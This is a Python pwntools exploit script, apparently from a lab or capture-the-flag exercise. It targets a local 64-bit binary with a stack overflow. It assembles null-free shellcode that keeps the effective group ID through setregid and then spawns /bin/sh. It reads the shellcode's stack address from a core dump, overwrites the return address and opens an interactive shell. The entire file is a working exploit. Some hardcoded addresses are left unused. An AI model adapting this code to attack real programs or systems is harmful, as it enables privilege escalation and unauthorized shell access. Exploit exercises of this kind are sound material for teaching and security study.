#!/usr/bin/env python3
from pwn import *
import os
# --- Binary & context ---
context.clear(arch="amd64", os="linux")
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "DEBUG"
# --- 64-bit Linux /bin/sh shellcode (no nulls) ---
shellcode = asm(
    f"""
xor eax, eax         /* RAX = 0 (31 C0), clears high 56 bits */
mov al, 108          /* RAX = 108 (getegid), 'B0 6C' has no 00 */
syscall                  /* getegid() -> returns egid in RAX */

mov rdi, rax         /* RDI = rgid = returned egid (48 89 C7) */
mov rsi, rax         /* RSI = egid = returned egid (48 89 C6) */

xor eax, eax         /* RAX = 0 (zero before 8-bit write) */
mov al, 114          /* RAX = 114 (setregid) */
syscall                  /* setregid(rdi, rsi) */

/* execve("/bin//sh", 0, 0) -- zero-free encoding */
xor     eax, eax             /* EAX=0 (31 C0) */
push    rax                  /* push 8 runtime zeros (50) */
mov     rbx, 0x68732f2f6e69622f  /* "/bin//sh" (no 00 bytes) */
push    rbx
mov     rdi, rsp             /* filename */
mov     rsi, rax             /* argv = 0 */
mov     rdx, rax             /* envp = 0 */
mov     al, 59               /* execve */
syscall
    """
)
offset = 28
shellcode_temp = shellcode +  b'A' * offset

crash = process(['./13-stack-ovfl-no-envp-64', shellcode_temp], env={'PATH':'/bin:/usr/bin'})

crashing_payload = cyclic(300)
crash.sendline(crashing_payload)  # to create a core dump
print(crash.recvline())
print(crash.recvline())
crash.wait()         
if "core" in os.listdir("."):
    pass
else:
    print("core still not there")
core = Core('./core')
shellcode_addr = core.stack.find(shellcode_temp)
print("\n Dummy shellcode addr! ")
print("--------------------------------")
print(shellcode_addr)
packed = p64(shellcode_addr)
print(packed)
crash.close()
p = process(['./13-stack-ovfl-no-envp-64', shellcode_temp], env={'PATH':'/bin:/usr/bin'})
# buffer_addr = p.recvline().split(b':')[-1].replace(b'\n',b'')
p.recvline()
# gdb.attach(p)
# buffer_addr = int(buffer_addr, 16)
read_buffer = 0xffffd0e0
return_addr = 0xffffd16c


payload = b'A' * (offset ) + packed
# payload += p32(packed)
# If your program uses gets()/fgets(stdin), sendline is fine:
with open ("shellcode.bin",'wb') as outfile:
    outfile.write(payload)
# gdb.attach(p)
p.sendline(payload)
p.interactive()
# core = Core('./core')
# shellcode_addr = core.stack.find(shellcode)

# assert shellcode_addr > 0, "failed to find payload"
# print("\n We found the shellcode addr! ")
# print("--------------------------------")
# packed = p32(shellcode_addr)
# print(packed)

# # If your program uses gets()/fgets(stdin), sendline is fine:
# with open ("shellcode.bin",'wb') as outfile:
#     outfile.write(payload)

# p.sendline(payload)

# p.interactive()